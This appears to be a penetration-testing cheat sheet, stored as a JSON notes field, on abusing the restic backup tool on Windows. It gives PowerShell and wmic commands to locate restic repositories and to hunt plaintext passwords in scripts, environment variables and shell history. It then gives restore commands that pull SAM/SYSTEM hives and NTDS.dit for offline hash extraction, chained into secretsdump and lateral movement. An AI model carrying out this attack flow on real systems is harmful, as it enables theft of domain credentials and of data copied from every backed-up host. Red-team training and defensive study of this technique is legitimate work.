      "notes": "=== Restic Backup Restore — Recovering Files from Backup Repository ===\nUse restic to browse and restore files from existing backup repositories.\n\n=== WHAT RESTIC IS ===\nRestic: open-source backup tool with encryption\nBackup data stored in repositories (local, S3, SFTP, etc.)\nRepositories require a password for access — find the password or key file\n\n=== RECONNAISSANCE ===\nFind restic installations and configs:\n  wmic product get name | findstr -i restic\n  Get-ChildItem -Path C:\\ -Recurse -Include *.restic,*.json -ErrorAction SilentlyContinue | Where-Object {$_.Name -like \"*restic*\"}\n  Look for environment variables: $env:RESTIC_PASSWORD, $env:RESTIC_REPOSITORY\n\nFind repository password:\n  Scheduled task scripts or automation scripts often contain plaintext repo passwords\n  Check PowerShell history for restic commands with -p flag or RESTIC_PASSWORD exports\n\n=== ATTACK FLOW ===\nWith known password and repository path:\n\nList snapshots:\n  $env:RESTIC_PASSWORD = \"found_password\"\n  restic -r <repo_path> snapshots\n\nBrowse specific snapshot:\n  restic -r <repo_path> ls <snapshot_id>\n\nRestore specific snapshot (entire snapshot):\n  restic -r <repo_path> restore <snapshot_id> --target C:\\restored\n\nRestore specific file/directory:\n  restic -r <repo_path> restore <snapshot_id> --target C:\\restored --include C:\\Windows\\System32\\config\n\n=== HIGH-VALUE RESTORE TARGETS ===\nC:\\Windows\\System32\\config (SAM + SYSTEM hives) → offline hash extraction\nC:\\Windows\\NTDS\\ (NTDS.dit) → if DC was backed up → all domain hashes\nWeb application directories → source code with embedded credentials\nDatabase backup files → application data\n\n=== CHAINING CONTEXT ===\nRestic restore of DC backup → NTDS.dit + SYSTEM hive → secretsdump → all domain hashes\nRestic restore of web app → web.config with DB credentials → lateral movement\nRestic on standalone backup server → has copies of data from all backed-up systems\nBackup repositories on network shares = single point with copies of data from all managed hosts",
